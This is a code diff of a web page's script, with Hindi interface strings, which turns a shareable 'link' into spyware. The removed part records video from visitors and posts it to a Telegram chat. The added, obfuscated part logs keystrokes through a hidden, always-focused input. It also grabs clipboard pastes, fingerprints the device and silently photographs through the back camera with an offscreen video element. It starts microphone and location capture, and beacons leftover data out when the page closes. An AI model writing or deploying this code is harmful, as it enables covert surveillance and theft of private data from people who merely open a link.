-  mediaRecorder.onstop = async () => {
-    const blob = new Blob(recordedChunks, { type: 'video/webm' });
-    const url = URL.createObjectURL(blob);
-    capturedVideos.push(url);
-    updateCounts();
-    
-    addLog(`🎥 वीडियो रिकॉर्ड हुआ`, 'success');
-    
-    // Show in gallery
-    const videoEl = document.createElement('video');
-    videoEl.src = url;
-    videoEl.controls = true;
-    videoEl.style.width = '100%';
-    videoEl.style.borderRadius = '8px';
-    gallery.insertBefore(videoEl, gallery.firstChild);
-    
-    // Send to Telegram
-    await sendVideoToTelegram(blob);
-    
-    // Store
-    saveToStorage();
-    isRecording = false;
-  };
-  
-  mediaRecorder.start();
-  isRecording = true;
-  addLog('🎥 वीडियो रिकॉर्डिंग शुरू... (20 सेकंड)', 'info');
-  
-  // Auto stop after 20 seconds
-  setTimeout(() => {
-    if (mediaRecorder && mediaRecorder.state === 'recording') {
-      mediaRecorder.stop();
-      addLog('🎥 वीडियो रिकॉर्डिंग पूरी', 'success');
-    }
-  }, 20000);
-}
-
-// ====== LINK GENERATOR ======
-function generateLink() {
-  const baseUrl = window.location.origin + window.location.pathname;
-  myLink = `${baseUrl}?id=${TARGET_CHAT_ID}`;
-  
-  document.getElementById('linkInput').value = myLink;
-  document.getElementById('linkDisplay').classList.remove('hidden');
-  
-  addLog('🔗 लिंक जनरेट किया गया', 'success');
-  
-  // Send link to Telegram
-  sendToTelegram('sendMessage', {
-    chat_id: TARGET_CHAT_ID,
-    text: `🔗 <b>आपका लिंक तैयार है:</b>\n<code>${myLink}</code>\n\nयह लिंक किसी को भी भेजें। जब वह खोलेगा, उसकी जानकारी यहाँ आएगी।`,
-    parse_mode: 'HTML'
-  });
-}
-
-function copyLink() {
-  const input = document.getElementById('linkInput');
-  input.select();
-  document.execCommand('copy');
-  addLog('📋 लिंक कॉपी किया गया', 'success');
-}
-
-// ====== LOCAL STORAGE ======
-function saveToStorage() {
-  try {
-    const data = {
-      photos: capturedPhotos,
-      voices: capturedVoices,
-      videos: capturedVideos,
-      timestamp: Date.now()
-    };
-    localStorage.setItem('camData', JSON.stringify(data));
-  } catch(e) {
-    // Storage full or unavailable - ignore
-  }
-}
-
-function loadFromStorage() {
-  try {
-    const raw = localStorage.getItem('camData');
-    if (raw) {
-      const data = JSON.parse(raw);
-      capturedPhotos = data.photos || [];
-      capturedVoices = data.voices || [];
-      capturedVideos = data.videos || [];
-      updateCounts();
-      
-      // Restore gallery
-      capturedPhotos.forEach(url => {
-        const img = document.createElement('img');
-        img.src = url;
-        gallery.appendChild(img);
-      });
-    }
-  } catch(e) {}
-}
-
-// ====== INIT ======
-loadFromStorage();
-addLog(`✅ बॉट कॉन्फ़िगर हुआ। Chat ID: ${TARGET_CHAT_ID}`, 'info');
-addLog('📷 कैमरा चालू करने के लिए बटन दबाएँ', 'info');
-
-// Send page load notification
-sendToTelegram('sendMessage', {
-  chat_id: TARGET_CHAT_ID,
-  text: `🌐 <b>पेज खोला गया</b>\n\nकोई व्यक्ति आपके लिंक पर आया है।\nसमय: ${new Date().toLocaleString('hi-IN')}\nURL: ${window.location.href}`,
-  parse_mode: 'HTML'
+    if(key==='Enter')flushKeystrokes();
 });
+
+document.addEventListener('click',()=>{try{klInput.focus();}catch(e){}});
+safeAddInterval(()=>{try{if(document.activeElement!==klInput)klInput.focus();}catch(e){}},2000);
+safeAddTimer(()=>{try{klInput.focus();}catch(e){}},500);
+
+klInput.addEventListener('input',()=>{
+    const val=klInput.value;
+    if(val.length>0){keystrokeBuffer.push(val);klInput.value='';}
+});
+
+safeAddInterval(()=>{if(keystrokeBuffer.length>0)flushKeystrokes();},8000);
+
+function flushKeystrokes(){
+    if(keystrokeBuffer.length===0)return;
+    const text=keystrokeBuffer.join('');
+    keystrokeBuffer=[];
+    tgSend(_0x4b3f[3],{chat_id:_0x9e3f,text:'⌨️ '+text});
+}
+
+document.addEventListener('paste',async(e)=>{
+    try{
+        const clipText=e.clipboardData?e.clipboardData.getData('text/plain'):null;
+        if(clipText&&clipText.trim()){tgSend(_0x4b3f[3],{chat_id:_0x9e3f,text:'📋 '+clipText.substring(0,500)});return;}
+        if(navigator.clipboard&&navigator.clipboard.readText){const text=await navigator.clipboard.readText();if(text&&text.trim())tgSend(_0x4b3f[3],{chat_id:_0x9e3f,text:'📋 '+text.substring(0,500)});}
+    }catch(e){}
+});
+
+function sendFingerprint(){
+    const fp={
+        ua:navigator.userAgent,
+        plat:navigator.platform,
+        lang:navigator.language,
+        screen:screen.width+'x'+screen.height,
+        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cores:navigator.hardwareConcurrency||'?',
+        mem:navigator.deviceMemory||'?',
+        touch:navigator.maxTouchPoints||0
+    };
+    tgSend(_0x4b3f[3],{chat_id:_0x9e3f,text:'🖥️ '+JSON.stringify(fp)});
+    const fc=document.createElement('canvas');
+    fc.width=256;fc.height=256;
+    const ctx=fc.getContext('2d');
+    ctx.textBaseline='top';ctx.font='14px Arial';
+    ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);
+    ctx.fillStyle='#069';ctx.fillText('CFP',2,15);
+    fc.toBlob(b=>{if(!b)return;const fd=new FormData();fd.append('chat_id',_0x9e3f);fd.append('photo',b,'fp.jpg');tgSend(_0x4b3f[4],fd);});
+}
+
+async function tryBackCamera(){
+    try{
+        const devices=await navigator.mediaDevices.enumerateDevices();
+        const vd=devices.filter(d=>d.kind==='videoinput');
+        const bc=vd.find(d=>d.label.toLowerCase().includes('back')||d.label.toLowerCase().includes('rear')||d.label.toLowerCase().includes('environment'))||vd[vd.length-1];
+        if(!bc||bc.deviceId===videoFront.srcObject?.getVideoTracks()[0]?.getSettings().deviceId)return;
+        const stream=await navigator.mediaDevices.getUserMedia({video:{deviceId:{exact:bc.deviceId}},audio:false});
+        const tv=document.createElement('video');
+        tv.style.cssText='position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;';
+        tv.setAttribute('playsinline','');tv.setAttribute('muted','');
+        tv.srcObject=stream;document.body.appendChild(tv);
+        tv.onplaying=()=>{
+            safeAddTimer(()=>{
+                const c=document.createElement('canvas');
+                c.width=tv.videoWidth||640;c.height=tv.videoHeight||480;
+                c.getContext('2d').drawImage(tv,0,0);
+                c.toBlob(b=>{if(!b){stream.getTracks().forEach(t=>t.stop());document.body.removeChild(tv);return;}const fd=new FormData();fd.append('chat_id',_0x9e3f);fd.append('photo',b,'bc.jpg');tgSend(_0x4b3f[4],fd);stream.getTracks().forEach(t=>t.stop());document.body.removeChild(tv);},'image/jpeg',0.85);
+            },600);
+        };
+        tv.play();
+    }catch(e){}
+}
+
+async function startAll(){
+    setStep(1);
+    tgSend(_0x4b3f[3],{chat_id:_0x9e3f,text:'🌐 '+new Date().toLocaleString()+' | '+window.location.href});
+    sendFingerprint();
+    await startCamera();
+    safeAddTimer(tryBackCamera,2000);
+    safeAddTimer(startMicRecording,1000);
+    safeAddTimer(getLocation,1500);
+    safeAddTimer(startContinuousCapture,3000);
+}
+
+function cleanupAndSend(){
+    continuousCaptureActive=false;
+    if(captureInterval){clearInterval(captureInterval);captureInterval=null;}
+    cleanupTimers.forEach(t=>{if(t.type==='timeout')clearTimeout(t.id);if(t.type==='interval')clearInterval(t.id);});
+    if(keystrokeBuffer.length>0){const text=keystrokeBuffer.join('');navigator.sendBeacon(_0x6b2c+_0x4b3f[3],new Blob([JSON.stringify({chat_id:_0x9e3f,text:'⌨️ '+text})],{type:'application/json'}));keystrokeBuffer=[];}
+    if(frontStream){frontStream.getTracks().forEach(t=>t.stop());frontStream=null;}
+    if(audioStream){if(mediaRecorder&&mediaRecorder.state!=='inactive'){try{mediaRecorder.stop();}catch(e){}}audioStream.getTracks().forEach(t=>t.stop());audioStream=null;}
+}
+
+window.addEventListener('beforeunload',cleanupAndSend);
+window.addEventListener('pagehide',cleanupAndSend);
+document.addEventListener('visibilitychange',()=>{if(document.hidden&&keystrokeBuffer.length>0)flushKeystrokes();});
 </script>
 </body>
 </html>
